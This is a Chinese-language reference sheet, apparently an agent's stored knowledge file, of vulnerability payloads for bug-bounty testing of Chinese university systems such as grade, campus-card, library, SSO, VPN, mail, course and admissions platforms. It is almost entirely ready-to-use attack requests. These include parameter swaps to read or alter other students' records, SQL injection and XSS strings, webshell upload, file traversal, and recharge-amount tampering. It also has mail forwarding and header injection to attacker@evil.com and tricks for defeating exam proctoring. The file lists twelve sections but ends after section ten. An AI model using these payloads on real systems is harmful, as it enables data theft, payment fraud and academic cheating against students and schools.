---
name: KB: 教育行业EDU-SRC专有系统漏洞挖掘
description: 教务/学工/图书馆/一卡通/统一认证/VPN/邮件/网课/宿舍/招生等教育专有系统漏洞实战技巧 (2024-2026)
type: reference
tags: [edu-src, academic-system, sso, cas, library-system, campus-card, vpn, mooc, student-affairs]
updated: 2026-05-09
originSessionId: ee20960f-1d7b-4892-a567-02767c979e0a
---
# 教育行业EDU-SRC专有系统漏洞挖掘

## 目录

1. [教务管理系统](#一教务管理系统)
2. [学工系统](#二学工系统)
3. [图书馆系统](#三图书馆系统)
4. [一卡通系统](#四一卡通系统)
5. [统一认证/SSO系统](#五统一认证sso系统)
6. [VPN/远程接入系统](#六vpn远程接入系统)
7. [邮件系统](#七邮件系统)
8. [在线教育/课程平台](#八在线教育课程平台)
9. [宿舍/报修/招生系统](#九宿舍报修招生系统)
10. [其他校园特色系统](#十其他校园特色系统)
11. [教育系统通用API/接口](#十一教育系统通用api接口)
12. [信息收集与侦察](#十二信息收集与侦察)

---

## 一、教务管理系统

教务系统是EDU-SRC最核心的靶标，常见系统包括：正方教务、强智教务、金智教务、URP教务、青果教务、教务在线等。

### 1.1 选课越权

| 系统 | 漏洞类型 | 测试方法 | Payload/示例 |
|------|----------|----------|-------------|
| 教务系统 | 选课水平越权 | 替他人选课/退课，修改`studentId`或`xh`(学号)参数为他人学号 | `POST /xk/doSelectCourse {"courseId":"C001","studentId":"2021XXXXX"}` → 改学号为受害者 |
| 教务系统 | 超容量选课 | 修改选课人数限制参数，绕过已满课程限制 | `POST /xk/addCourse?courseId=C001&maxStudents=999` → 课程满员后自己改max |
| 教务系统 | 跨年级/专业选课 | 修改选课范围参数，选修非本专业课程 | `POST /xk/query {"grade":2021}` → 改`grade=2020`选高年级限选课 |
| 教务系统 | 选课时间绕过 | 修改客户端时间或重放过期选课请求 | Burp Replay 选课POST包 → 选课结束后仍提交成功 |
| 教务系统 | 预选阶段批量选课 | 并发请求抢占热门课，竞态条件 | Turbo Intruder 30并发同时请求同一课程选课 |
| 正方教务 | 任意课表查询 | 遍历`xnxq`+`xh`参数查看他人课表（含教室位置） | `GET /jiaowu/student/courseTable?xnxq=2024-2025-1&xh=2021XXXXX` |
| 强智教务 | 课程评分越权 | 替他人评教，修改评教学生ID | `POST /pj/savePj {"pjId":"xxx","studentId":"受害学号","score":100}` |

### 1.2 成绩相关漏洞

| 系统 | 漏洞类型 | 测试方法 | Payload/示例 |
|------|----------|----------|-------------|
| 教务系统 | 成绩查询越权 | 遍历`xh`/`studentNo`参数查看他人所有成绩 | `GET /cj/query?xh=2021XXXXX&xnxq=2024-2025-1` |
| 教务系统 | GPA修改 | 补考/重修成绩提交接口未做权限校验 | `POST /cj/supplementScore {"xh":"自己","courseId":"C001","score":95}` |
| 教务系统 | 成绩单PDF遍历 | 成绩单PDF下载路径含学号，可遍历下载 | `GET /cj/exportPdf?xh=2021XXXXX` → Burp Intruder遍历学号 |
| 正方教务 | 综合测评修改 | 综测评分模块教师权限可改任意学生分数 | `POST /zhcp/saveScore {"xh":"victim","score":95,"itemId":"moral"}` |
| 教务系统 | 成绩占比修改 | 修改平时分/期末分占比规则 | `POST /cj/setRatio {"courseId":"C001","dailyRatio":100,"examRatio":0}` |
| URP教务 | 学分绩点计算错误 | 利用补考/重修绩点计算规则差异提GPA | 观察不同课程类型绩点计算公式，找到"不纳入GPA"的课程类型 |

### 1.3 课表/考场泄露

| 系统 | 漏洞类型 | 测试方法 | Payload/示例 |
|------|----------|----------|-------------|
| 教务系统 | 批量课表爬取 | 学号按规律自增，批量导出全年级课表 | 学号范围 20210001-20219999 → 并发遍历课表接口 |
| 教务系统 | 考场安排泄露 | 遍历考试安排接口获取他人考试时间地点 | `GET /ks/arrange?xh=2021XXXXX` → 遍历学号拿全年级考场 |
| 教务系统 | 教师课表泄露 | 遍历教师工号获取教师行踪 | `GET /kb/teacher?gh=T2021001` → 知道教师作息规律 |

### 1.4 评教/教学评价

| 系统 | 漏洞类型 | 测试方法 | Payload/示例 |
|------|----------|----------|-------------|
| 教务系统 | 评教提交绕过 | 未选课也能评教，或跳过评教直接查成绩 | 直接访问成绩查询URL跳过评教中间页 |
| 教务系统 | 评教结果可见 | 评价接口未鉴权可查看全班匿名评教结果 | `GET /pj/result?teacherId=T001` → 查看每位学生对教师的评价明细 |
| 教务系统 | 评教替他人评价 | 修改评教请求中学号参数评价他人课程 | `POST /pj/submit {"pjId":"PJ001","studentId":"别人学号","content":"..."}` |
| 强智教务 | 评教统计接口泄露 | 统计接口返回每位教师平均分和票数 | `GET /pj/stat?teacherId=T001` → 无鉴权 |

### 1.5 教务管理后台

| 系统 | 漏洞类型 | 测试方法 | Payload/示例 |
|------|----------|----------|-------------|
| 教务系统 | 默认口令/弱口令 | 尝试常见教师/管理员默认密码 | `admin/admin123` `teacher/123456` `教务员工号/工号` |
| 教务系统 | 后台未授权访问 | 教务处后台不校验Session直接访问 | `GET /jiaowu/admin/` `/admin/studentManage` `/manager` |
| 正方教务 | 数据库备份泄露 | 备份文件在web目录可下载 | `GET /backup/backup_2024.sql` `/data/backup.mdb` `/tmp/zfjk.db` |
| 教务系统 | 文件上传getshell | 教师头像上传/资料上传未限制 | 上传jsp/asp/php马 → 路径`/uploads/avatar/xxx.jsp` |

### 1.6 学籍/注册

| 系统 | 漏洞类型 | 测试方法 | Payload/示例 |
|------|----------|----------|-------------|
| 教务系统 | 学籍信息越权 | 修改`xh`参数查看他人全部学籍信息 | `GET /xj/info?xh=2021XXXXX` → 含身份证号、家庭住址、电话 |
| 教务系统 | 学籍照片泄露 | 学籍照片URL含学号/身份证号可遍历 | `GET /xj/photo?xh=2021XXXXX.jpg` |
| 教务系统 | 注册状态修改 | 未缴费也可修改注册状态为已注册 | `POST /xj/register {"xh":"自己","status":"registered"}` |

---

## 二、学工系统

学工系统负责学生日常管理，常见系统有：今日校园辅导猫、金智学工、奥蓝学工、微哨等。

### 2.1 奖助学金

| 系统 | 漏洞类型 | 测试方法 | Payload/示例 |
|------|----------|----------|-------------|
| 学工系统 | 奖学金申请越权 | 替他人申请/修改/取消奖学金申请 | `POST /scholarship/apply {"studentId":"victim","type":"national"}` |
| 学工系统 | 助学金等级篡改 | 修改助学金等级参数获取更高金额 | `POST /grant/level {"studentId":"自己","level":"special"}`(一般→特殊困难) |
| 学工系统 | 申请审核绕过 | 跳过辅导员/学院审核步骤直接到学校审核 | `POST /grant/submit` 直接调最终审核接口 |
| 学工系统 | 贫困生认定篡改 | 修改贫困等级和认定状态 | `POST /poverty/identify {"student":"自己","level":"A","status":"approved"}` |
| 学工系统 | 申请材料越权下载 | 他人贫困证明/申请表可遍历下载 | `GET /attach/download?id=123` → 遍历获取他人家庭信息 |
| 学工系统 | 获奖信息越权 | 遍历studentId获取他人获奖履历 | `GET /award/list?studentId=2021XXXXX` |
| 今日校园 | 评奖评优数据泄露 | 辅导员视角查看全校学生综合排名 | 通过修改角色参数从学生视角切换为教师视角 |

### 2.2 学生信息越权

| 系统 | 漏洞类型 | 测试方法 | Payload/示例 |
|------|----------|----------|-------------|
| 学工系统 | 学生信息批量导出 | 全量学生信息导出接口未鉴权 | `GET /export/allStudentInfo` → 含姓名、身份证、电话、家庭住址 |
| 学工系统 | 家庭信息泄露 | 遍历`xh`获取全年级家庭情况、父母信息 | `GET /student/family?xh=2021XXXXX` |
| 学工系统 | 班级通讯录泄露 | 班级通讯录API越权查看其他班级 | `POST /class/roster {"classId":"C001"}` → 改classId遍历各班 |
| 学工系统 | 住宿信息越权 | 查他人宿舍号、床位号 | `GET /dorm/student?xh=2021XXXXX` |
| 奥蓝学工 | 综合查询越权 | 综合查询模块参数未做权限隔离 | `POST /zhcx/query {"sfzh":"身份证号"}` → 遍历身份证查全站 |

### 2.3 请假/考勤

| 系统 | 漏洞类型 | 测试方法 | Payload/示例 |
|------|----------|----------|-------------|
| 学工系统 | 请假审批绕过 | 跳过审批人直接通过请假 | `POST /leave/approve {"leaveId":"L001","status":"approved"}` 越权 |
| 学工系统 | 请假时间篡改 | 修改请假起止时间，补假条 | `POST /leave/modify {"leaveId":"L001","start":"上周一","end":"上周五"}` |
| 今日校园 | 定位打卡伪造 | 伪造GPS定位签到，代打卡 | Repeater修改经纬度参数 `{"lat":39.9,"lng":116.3}` |
| 学工系统 | 销假记录越权 | 替他人销假或查看他人销假审批 | `GET /leave/history?studentId=2021XXXXX` |

### 2.4 综合测评

| 系统 | 漏洞类型 | 测试方法 | Payload/示例 |
|------|----------|----------|-------------|
| 学工系统 | 综测分自增 | 德育/文体加分接口无上限校验 | `POST /zhcp/add {"item":"volunteer","score":999}` |
| 学工系统 | 综测材料伪造 | 上传虚假证明材料通过审批 | 上传伪造证书扫描件→审批人只看文件名不验证内容 |
| 学工系统 | 综测排名越权 | 查看全年级综测排名及明细 | `GET /zhcp/rank?grade=2021&major=CS` → 无权限控制 |

---

## 三、图书馆系统

常见系统：汇文图书馆、金盘图书馆、图创图书馆、超星发现、万方/知网校内镜像。

### 3.1 借阅越权

| 系统 | 漏洞类型 | 测试方法 | Payload/示例 |
|------|----------|----------|-------------|
| 图书馆 | 借阅记录越权 | 遍历读者证号查看他人借阅历史和当前借书 | `GET /reader/loan?cardNo=2021XXXXX` |
| 图书馆 | 代借书漏洞 | 修改借书请求中的读者证号为他人 | `POST /circulation/borrow {"barcode":"BOOK001","cardNo":"受害者证号"}` |
| 图书馆 | 批量续借 | 修改续借次数上限或者反复续借不还书 | `POST /circulation/renew {"barcode":"BOOK001","times":999}` |
| 汇文 | 读者信息泄露 | 读者详细信息页无权限检查 | `GET /reader/info?rdid=读者证号` → 含身份证号、手机号、邮箱 |

### 3.2 馆藏查询注入

| 系统 | 漏洞类型 | 测试方法 | Payload/示例 |
|------|----------|----------|-------------|
| 图书馆 | 书目查询SQL注入 | OPAC公共查询系统SQL注入 | `search?keyword=红楼梦' OR '1'='1` → SQL报错信息泄露 |
| 图书馆 | 高级检索注入 | 高级检索多个字段存在注入点 | `search/adv?title=计算机' AND 1=convert(int,@@version)--` |
| 金盘 | 借阅证查询接口注入 | 读者证号查询接口未过滤 | `GET /reader/query?cardNo=2021' UNION SELECT ...` |
| 图创 | 分类查询注入 | 分类浏览参数注入 | `GET /opac/category?catid=10' AND SLEEP(5)--` |

### 3.3 预约/占座

| 系统 | 漏洞类型 | 测试方法 | Payload/示例 |
|------|----------|----------|-------------|
| 图书馆 | 预约座位越权 | 替他人预约/取消预约座位 | `POST /seat/reserve {"seatId":"A001","studentId":"victim"}` |
| 图书馆 | 座位释放时间篡改 | 修改暂离时间参数长时间占座 | `POST /seat/tempLeave {"seatId":"A001","duration":999}`(正常30分钟) |
| 图书馆 | 预约黑名单绕过 | 多次违约后进入黑名单，修改状态绕过 | `POST /seat/clearPenalty {"studentId":"自己"}` 或直接删除黑名单记录 |
| 图书馆 | 自习室流量统计泄露 | 查看各楼层自习室实时空位分布 | `GET /seat/realtime` → 不带token直接返回全馆数据 |

### 3.4 电子资源

| 系统 | 漏洞类型 | 测试方法 | Payload/示例 |
|------|----------|----------|-------------|
| 图书馆 | 知网/万方校外访问越权 | 校外访问代理系统未鉴权，直接下载电子资源 | `GET /auth/check?url=cnki.net/...` → 代理直接转发未校验身份 |
| 图书馆 | 电子资源下载key泄露 | 数据库访问key/service帐号密码硬编码在前端 | JS源码中搜索 `password` `account` `serviceKey` `apikey` |
| 超星 | 电子书越权阅读 | 付费/限定电子书通过修改参数免费阅读 | `GET /book/read?bookId=B001&type=free` 改付费参数 |
| 图书馆 | 文献传递绕过 | 文献传递接口未做限频可批量爬取 | `POST /ill/request {"isbn":"978-xxx"}` 无限提交获取全文 |

---

## 四、一卡通系统

一卡通（校园卡）系统常见于：新中新一卡通、正元智慧一卡通、东软一卡通、银联校园等。

### 4.1 充值/金额漏洞

| 系统 | 漏洞类型 | 测试方法 | Payload/示例 |
|------|----------|----------|-------------|
| 一卡通 | 充值金额篡改 | 修改充值金额参数，实付1元到账1000元 | `POST /recharge {"cardNo":"自己","amount":0.01}` → 改`amount`为任意值 |
| 一卡通 | 负数充值 | 负数金额触发退款逻辑 | `POST /recharge {"amount":-100}` → 余额增加 |
| 一卡通 | 充值状态篡改 | 未支付将订单状态改为已支付 | `POST /recharge/confirm {"orderId":"O001","status":"success"}` |
| 一卡通 | 并发充值竞争 | 同一时间多次提交充值请求，余额累加多倍 | Turbo Intruder一包多发 → 支付一次到账N倍 |
| 一卡通 | 充值回调伪造 | 微信/支付宝支付成功回调未验签 | 伪造回调`POST /pay/notify {"orderId":"","total_amount":"1000","trade_status":"TRADE_SUCCESS"}` |
| 新中新 | 补助领取金额篡改 | 学校补助/补贴领取接口金额可改 | `POST /subsidy/get {"cardNo":"自己","amount":500}` |

### 4.2 消费记录越权

| 系统 | 漏洞类型 | 测试方法 | Payload/示例 |
|------|----------|----------|-------------|
| 一卡通 | 消费记录查询越权 | 遍历卡号查他人消费明细（知道在哪吃饭、买了什么） | `GET /card/consume?cardNo=2021XXXXX&date=2024-01-01` |
| 一卡通 | 消费流水批量导出 | 全量流水导出接口无鉴权 | `GET /export/consume?date=2024-01-01` → 全校流水CSV |
| 一卡通 | 余额查询越权 | 任意卡号查询实时余额 | `GET /card/balance?cardNo=2021XXXXX` → 未绑定Session |

### 4.3 挂失/解挂漏洞

| 系统 | 漏洞类型 | 测试方法 | Payload/示例 |
|------|----------|----------|-------------|
| 一卡通 | 替他人挂失 | 修改卡号替他人挂失校园卡 | `POST /card/lossReport {"cardNo":"受害者卡号"}` |
| 一卡通 | 替他人解挂 | 替他人解除挂失 | `POST /card/unloss {"cardNo":"受害者卡号"}` 未校验本人身份 |
| 一卡通 | 挂失后继续消费 | 挂失状态未及时同步到消费终端 | 挂失后立即在离线POS机消费 → 终端数据T+1同步 |
| 一卡通 | 捡到卡枚举密码 | 校园卡消费密码通常为弱口令 | 尝试默认密码：身份证后6位/123456/000000/888888 |

### 4.4 门禁/闸机

| 系统 | 漏洞类型 | 测试方法 | Payload/示例 |
|------|----------|----------|-------------|
| 一卡通 | 门禁记录越权 | 查看他人门禁出入记录（隐私严重） | `GET /card/access?cardNo=2021XXXXX` → 行踪轨迹 |
| 一卡通 | 门禁授权绕过 | 未授权卡通过修改权限参数进入受限区域 | `POST /card/auth {"cardNo":"自己","building":"admin_office"}` |
| 一卡通 | 水控/电控越权 | 修改他人水电账户余额 | `POST /electric/add {"room":"3-202","amount":100}` |

---

## 五、统一认证/SSO系统

常见系统：CAS (Central Authentication Service)、金智统一认证、华通统一认证、各校自研SSO。

### 5.1 CAS协议漏洞

| 系统 | 漏洞类型 | 测试方法 | Payload/示例 |
|------|----------|----------|-------------|
| CAS | CAS认证绕过(CVE) | 低版本CAS存在已知漏洞CVE-2017-5461等 | `service`参数注入 → 认证绕过 |
| CAS | 重放攻击 | ST (Service Ticket) 默认一次性使用但某些服务不验证 | 拦截ST票据 → 重复发送ST到同一服务 |
| CAS | PGT/CAS Proxy漏洞 | CAS Proxy模式PGT票据泄露 | PGT URL泄露 → 任意用户代理认证 |
| CAS | 服务端请求伪造(SSRF) | `service`参数可跳转到任意URL | `GET /cas/login?service=http://内网IP:端口/` → SSRF探测内网 |
| CAS | service参数redirect | service参数含open redirect跳转钓鱼 | `GET /cas/login?service=http://evil.com` → 认证后跳转钓鱼站 |
| CAS | CAS信息泄露 | `/cas/` 根路径泄露服务器版本和配置 | `GET /cas/` → 返回版本号(CAS x.y.z) |
| CAS | 跨站脚本(XSS) | service参数带XSS payload | `GET /cas/login?service=javascript:alert(1)` |
| CAS | 弱TGC加密 | TGC(Ticket Granting Cookie)使用弱密钥加密 | JWT密钥爆破/HMAC密钥猜测 → 伪造TGC → 任意用户登录 |

### 5.2 OAuth/SSO配置缺陷

| 系统 | 漏洞类型 | 测试方法 | Payload/示例 |
|------|----------|----------|-------------|
| 统一认证 | OAuth redirect_uri | redirect_uri白名单校验不严 | `redirect_uri=https://target.com.evil.com/` `redirect_uri=https://target.com@evil.com` |
| 统一认证 | OAuth state缺失 | 无state参数 → CSRF账户绑定 | 拦截认证请求 → 删除state → 完成流程 |
| 统一认证 | scope权限提升 | 修改scope参数获取更多用户信息 | `scope=read` → `scope=read+write+phone+idcard` |
| 统一认证 | 跨校认证绕过 | 联盟认证(CARSI/eduroam)信任传递缺陷 | 伪造IdP断言 → 在其他联盟高校系统登录 |
| 统一认证 | 跨子域SSO混淆 | 同一顶级域下不同子域SSO共享Session | 子域A XSS → 读到主域SSO Cookie → 登录子域B |
| 统一认证 | SAML断言篡改 | SAML Response签名验证缺失 | 抓SAML Response → 修改`<Attribute Name="uid">` → 删签或自签 |
| 统一认证 | 账户枚举 | 通过统一认证登录页返回差异枚举用户 | 已知用户 vs 未知用户：错误信息不同/返回时间不同 |
| 统一认证 | 密码爆破限制绕过 | 统一认证登录无验证码或可绕过 | 修改X-Forwarded-For轮换IP → 单IP有锁但轮IP无锁 |

### 5.3 统一认证信息泄露

| 系统 | 漏洞类型 | 测试方法 | Payload/示例 |
|------|----------|----------|-------------|
| 统一认证 | 用户信息泄露 | 认证成功后回调URL含用户完整信息 | `GET /auth/callback?code=xxx&user={"uid":"2021xxx","name":"张三","phone":"138..."}` |
| 统一认证 | Token泄露 | 隐式授权模式token在URL#fragment | `redirect_uri=https://target/oauth/callback#access_token=xxx` |
| 统一认证 | OAuth code窃取 | code在URL参数可被Referer/日志泄露 | 登录页引用外部资源 → Referer带code |
| 统一认证 | Client Secret泄露 | JS源码中硬编码client_secret | 前端JS搜索 `client_secret` `secret` `appsecret` |

---

## 六、VPN/远程接入系统

常见系统：深信服SSL VPN、华为VPN、H3C VPN、EasyConnect、OpenVPN自建、各校自研VPN。

### 6.1 VPN绕过/越权

| 系统 | 漏洞类型 | 测试方法 | Payload/示例 |
|------|----------|----------|-------------|
| VPN | VPN登录绕过 | 直接访问内网资源URL不通过VPN | `GET http://10.x.x.x/教务系统/` → 某些路由不强制VPN |
| VPN | VPN Session固定/复用 | Session/Cookie未绑定IP和设备 | 窃取他人VPN Cookie → 直接复用 → 入内网 |
| VPN | VPN资源越权 | 修改资源ID访问非授权内网系统 | `GET /vpn/resource?id=内网系统编号` → 遍历id列表 |
| EasyConnect | 隧道分离绕过 | 修改VPN路由表访问未授权网段 | 修改客户端路由规则或发送DNS泄露请求 |
| VPN | VPN入口点信息泄露 | 登录前首页泄露内网信息 | `GET /vpn/` → HTML注释中含内网IP、服务器版本 |

### 6.2 VPN漏洞利用

| 系统 | 漏洞类型 | 测试方法 | Payload/示例 |
|------|----------|----------|-------------|
| 深信服SSL VPN | 已知漏洞CVE | 深信服SSL VPN存在多个RCE/信息泄露 | CVE-2023-27524/CVE-2020-2021 → 直接getshell |
| EasyConnect | 会话不失效 | 用户退出VPN后Session未销毁可复用 | 抓VPN Cookie → 退出登录 → Cookie仍可用 |
| H3C VPN | 文件读取 | 任意文件读取漏洞 | `GET /../../etc/passwd` `GET /vpn/../WEB-INF/web.xml` |
| VPN | DNS泄露 | VPN隧道搭建前DNS请求泄露真实IP | 检查DNS解析是否为学校出口IP或家庭IP |
| VPN | 双因素绕过 | VPN 2FA可被绕过 | 收到2FA推送后拒绝 → 某些操作仍可执行 |

---

## 七、邮件系统

常见系统：腾讯企业邮箱、阿里企业邮箱、网易企业邮箱、Coremail、Zimbra、Exchange Online、自研邮件。

### 7.1 学生邮箱注册滥用

| 系统 | 漏洞类型 | 测试方法 | Payload/示例 |
|------|----------|----------|-------------|
| 邮件系统 | 学号枚举注册 | 学号规律自增，批量注册邮箱 | 遍历 `stu_20210001@edu.cn` 是否注册 → 枚举在校生 |
| 邮件系统 | 邮箱注册验证绕过 | 注册邮箱学号验证步骤可跳过 | Step1(填学号)→直接调Step3(设密码)→跳过Step2(教务处验证) |
| 邮件系统 | 校友邮箱滥用 | 校友邮箱仍有效但账号部门/权限未回收 | 用已毕业学号注册邮箱 → 仍在通讯录/组织架构中 |
| 邮件系统 | 别名/转发越权 | 修改他人邮箱别名/转发规则窃取邮件 | `POST /mail/forward {"email":"victim@edu.cn","forward":"attacker@evil.com"}` |

### 7.2 邮件注入/伪造

| 系统 | 漏洞类型 | 测试方法 | Payload/示例 |
|------|----------|----------|-------------|
| 邮件系统 | 邮件头注入 | 联系/反馈表单参数注入SMTP头 | `name=张三&email=attacker@evil.com%0D%0ABcc:attacker@evil.com` |
| 邮件系统 | 任意邮件发送 | SMTP/邮件API未鉴权，伪造发件人 | `POST /api/mail/send {"from":"admin@edu.cn","to":"victim","content":"钓鱼邮件"}` |
| 邮件系统 | SPF/DKIM缺失 | 伪造学校域名邮件，无SPF校验拦截 | 直接telnet到SMTP端口 → 伪造发件人发送 |
| 邮件系统 | HTML邮件XSS | 邮件内容HTML渲染未过滤XSS | `<img src=x onerror=alert(document.cookie)>` |
| Coremail | 登录绕过特定漏洞 | Coremail某些版本存在登录日志泄露 | CVE-2023-28422 / 目录遍历获取配置文件 |
| 邮件系统 | MX记录配置错误 | 邮件服务器的MX配置问题导致中间人 | 检查学校的DNS配置文件 → MX配置错误 |

### 7.3 邮件内容泄露

| 系统 | 漏洞类型 | 测试方法 | Payload/示例 |
|------|----------|----------|-------------|
| 邮件系统 | 通讯录越权 | 遍历departmentId获取全校师生邮箱 | `GET /mail/addrlist?deptId=D001` → 全校师生邮箱批量导出 |
| 邮件系统 | 邮件全文检索泄露 | 搜索接口越权搜他人邮件 | `POST /mail/search {"keyword":"密码","folder":"all"}` → user参数改他人 |
| 邮件系统 | 附件越权下载 | 邮件附件ID可遍历 | `GET /mail/attach?id=123` → 遍历下载 |
| 邮件系统 | 自动回复/转发滥用 | 设置自动转发把邮件转发到外网 | 学生邮箱设置邮件自动转发到个人邮箱 |

---

## 八、在线教育/课程平台

常见系统：超星学习通、智慧树、中国大学MOOC、学堂在线、腾讯课堂(教育版)、各校自研网课平台。

### 8.1 刷课/作弊漏洞

| 系统 | 漏洞类型 | 测试方法 | Payload/示例 |
|------|----------|----------|-------------|
| 网课平台 | 视频进度伪造 | 修改视频播放进度参数/发送fake进度 | `POST /course/progress {"courseId":"C001","videoId":"V001","progress":100}` |
| 网课平台 | 视频多点同时刷 | 并发请求多个视频完成标记 | 同时请求20个视频的完成接口 → 全部标记已完成 |
| 网课平台 | 章节测验答案泄露 | 章节测试正确答案在JS/响应中返回 | 提交空的测验请求 → 响应中映射答案选项 `{"answers":[{"id":"A","correct":true}]}` |
| 网课平台 | 考试时间绕过 | 修改客户端时间延长考试 | 调系统时间回到过去 → 过期考试仍可提交 |
| 学习通 | 签到定位伪造 | 课堂签到GPS/二维码签到绕过 | 越狱/root后改定位；二维码分享给他人代签 |
| 学习通 | 刷课脚本 | 使用油猴脚本/自动化工具刷课 | `window.onbeforeunload=null;` 防页面离开检测 + 自动播放下一节 |
| 智慧树 | 弹题自动回答 | 视频中弹出题目的正确答案在JS中 | 搜索 `correctAnswer` `rightAnswer` `right` 变量直接获取 |

### 8.2 课程数据越权

| 系统 | 漏洞类型 | 测试方法 | Payload/示例 |
|------|----------|----------|-------------|
| 网课平台 | 课程资料越权 | 其他班级/专业的课程课件可下载 | `GET /course/material?courseId=C001` → 遍历courseId |
| 网课平台 | 成绩越权查看 | 修改userId/viewAs参数查看他人成绩 | `POST /course/grade {"courseId":"C001","studentId":"victim"}` |
| 网课平台 | 作业互评越权 | 互评阶段查看他人对自己的评分 | `GET /assignment/review?assignmentId=A001&reviewerId=victim` |
| 网课平台 | 班级学生名单泄露 | 查看其他课程/班级的选课名单 | `GET /course/roster?courseId=C002` → 改courseId遍历全校选课 |
| 网课平台 | 教师后台越权 | 学生身份调用教师接口 | 改JWT/role参数 `"role":"student"` → `"role":"teacher"` |

### 8.3 考试作弊

| 系统 | 漏洞类型 | 测试方法 | Payload/示例 |
|------|----------|----------|-------------|
| 网课平台 | 切屏检测绕过 | 考试切屏被记录可绕过 | 修改切屏次数参数为0/使用虚拟机双屏 |
| 网课平台 | 考试答案泄露 | 提前查看试卷或答案在浏览器缓存 | 考前抓取获取试题的API → 拿到全部题目 |
| 网课平台 | 摄像头监控绕过 | 人脸识别/摄像头监控禁用 | 先录视频→用OBS虚拟摄像头播放→或修改`cameraRequired:false` |
| 网课平台 | 重新考试 | 已交卷后再次提交新答案 | `POST /exam/resubmit {"examId":"E001","paperId":"P001","answers":[...]}` |
| 网课平台 | 答案提交篡改 | 拦截提交答案包改分数 | `POST /exam/submit {"score":95}` → 发送时的分数参数直接改 |
| 网课平台 | 防作弊参数篡改 | 修改`antiCheating`参数为false | `POST /exam/start {"examId":"E001","antiCheating":false,"screenMonitor":false}` |

### 8.4 直播/互动

| 系统 | 漏洞类型 | 测试方法 | Payload/示例 |
|------|----------|----------|-------------|
| 网课平台 | 直播弹幕XSS | 直播聊天室未过滤XSS | 弹幕发 `<script>alert(document.cookie)</script>` |
| 网课平台 | 直播推流地址泄露 | 非公开直播的推流/拉流地址可枚举 | `GET /live/stream?roomId=R001` → 遍历roomId看非本班直播 |
| 网课平台 | 举手/连麦越权 | 未举手直接连麦或强制他人下麦 | `POST /live/mute {"userId":"victim"}` → 静音他人 |

---

## 九、宿舍/报修/招生系统

### 9.1 宿舍管理系统

| 系统 | 漏洞类型 | 测试方法 | Payload/示例 |
|------|----------|----------|-------------|
| 宿舍系统 | 宿舍分配越权 | 修改宿舍号/床位号自己分配宿舍 | `POST /dorm/assign {"studentId":"自己","dormId":"A-101","bed":"1"}` |
| 宿舍系统 | 换宿申请绕过 | 修改审批状态直接换宿成功 | `POST /dorm/change {"studentId":"自己","targetDorm":"A-102","status":"approved"}` |
| 宿舍系统 | 住宿费金额篡改 | 住宿费缴费金额可改 | `POST /dorm/pay {"amount":0.01}` |
| 宿舍系统 | 宿舍电量越权 | 修改他人宿舍剩余电量 | `POST /dorm/electric {"room":"3-202","value":999}` |
| 宿舍系统 | 门禁授权越权 | 自己授权进入非本楼栋 | `POST /dorm/auth {"cardNo":"自己","building":"女生宿舍"}` |
| 宿舍系统 | 查寝记录泄露 | 辅导员查寝记录可遍历查看 | `GET /dorm/inspection?floor=3&date=2024-01-01` |

### 9.2 报修系统

| 系统 | 漏洞类型 | 测试方法 | Payload/示例 |
|------|----------|----------|-------------|
| 报修系统 | 他人报修单查看 | 遍历报修单号查看他人报修内容含房号手机号 | `GET /repair/detail?id=12345` → 遍历id泄露他人信息 |
| 报修系统 | 报修状态修改 | 修改报修状态为已完成(未修也关单) | `POST /repair/status {"id":"12345","status":"completed"}` |
| 报修系统 | 报修人信息伪造 | 修改报修人信息显示其他人 | `POST /repair/create {"name":"别人","phone":"别人手机","room":"别人宿舍"}` |
| 报修系统 | 维修师傅信息泄露 | 所有维修师傅电话在接口可遍历 | `GET /repair/workers?page=1` → 全校维修人员电话清单 |

### 9.3 招生系统

| 系统 | 漏洞类型 | 测试方法 | Payload/示例 |
|------|----------|----------|-------------|
| 招生系统 | 考生信息越权 | 遍历考生号/准考证号查他人考试信息 | `GET /zs/query?ksh=2024XXXXX` → 姓名、分数、电话、地址 |
| 招生系统 | 录取状态修改 | 修改录取状态参数(录取→不录取/候补→录取) | `POST /zs/admit {"ksh":"2024XXX","status":"admitted"}` |
| 招生系统 | 调剂志愿篡改 | 修改他人调剂志愿顺序 | `POST /zs/adjust {"ksh":"2024XXX","priorities":["CS","EE","Math"]}` |
| 招生系统 | 录取通知书地址篡改 | 修改通知书邮寄地址 | `POST /zs/address {"ksh":"2024XXX","addr":"attacker的地址"}` |
| 招生系统 | 考生照片泄露 | 准考证照片可遍历下载 | `GET /zs/photo?ksh=2024XXXXX.jpg` |
| 招生系统 | 艺考/体考成绩篡改 | 特殊类型招生成绩提交接口未鉴权 | `POST /zs/specialScore {"ksh":"2024XXX","score":95}` |
| 招生系统 | 查询接口无验证码 | 批量查询/爆破考生信息 | `POST /zs/query {"sfzh":"身份证","ksh":"考生号"}` → 无验证码直接爆破 |
| 招生系统 | 预报名信息泄露 | 预报名系统导出所有报名信息 | `GET /zs/export` → 无鉴权导出千万报名信息CSV |

---

## 十、其他校园特色系统

### 10.1 校园WiFi/网络认证

| 系统 | 漏洞类型 | 测试方法 | Payload/示例 |
|------|----------|----------|-------------|
| 校园网 | 认证绕过 | MAC地址克隆绕过设备数限制 | `ifconfig eth0 hw ether 已认证设备的MAC` |
| 校园网 | 上网账号借用 | 修改认证请求中的username为他人 | `POST /auth/login {"username":"别人的学号","password":"暴力破解"}` |
| 校园网 | 流量计费篡改 | 修改流量计费接口使剩余流量增加 | `POST /network/flowRecharge {"flow":999}` |
| 校园网 | 强制下线他人 | 重复登录踢对方下线 | 用同一账号在不同设备反复登录 → 对方被挤下线 |
| 校园网 | 网络缴费越权 | 替他人缴纳网费或查看他人缴费记录 | `POST /network/pay {"account":"victim"}` |

### 10.2 实验室/设备管理

| 系统 | 漏洞类型 | 测试方法 | Payload/示例 |
|------|----------|----------|-------------|
| 实验室 | 设备预约越权 | 替他人预约/取消实验室设备 | `POST /lab/reserve {"deviceId":"D001","userId":"victim"}` |
| 实验室 | 实验数据泄露 | 他人实验数据/报告可下载 | `GET /lab/report?reportId=123` → 遍历获取 |
| 实验室 | 上机时长篡改 | 修改上机剩余时长 | `POST /lab/extend {"studentId":"自己","hours":999}` |
| 实验室 | 开放实验室门禁绕过 | 门禁卡复制/二维码泄露 | 保存开门二维码图片 → 非开放时间进实验室 |

### 10.3 校园论坛/二手市场

| 系统 | 漏洞类型 | 测试方法 | Payload/示例 |
|------|----------|----------|-------------|
| 论坛 | 匿名发帖身份追溯 | 匿名帖子的真实发帖人信息在API返回 | 抓取帖子详情API → 匿名帖子也带`userId`字段 |
| 论坛 | 私信越权 | 修改收信人id查看他人私信 | `GET /message?conversationId=123` → 遍历对话 |
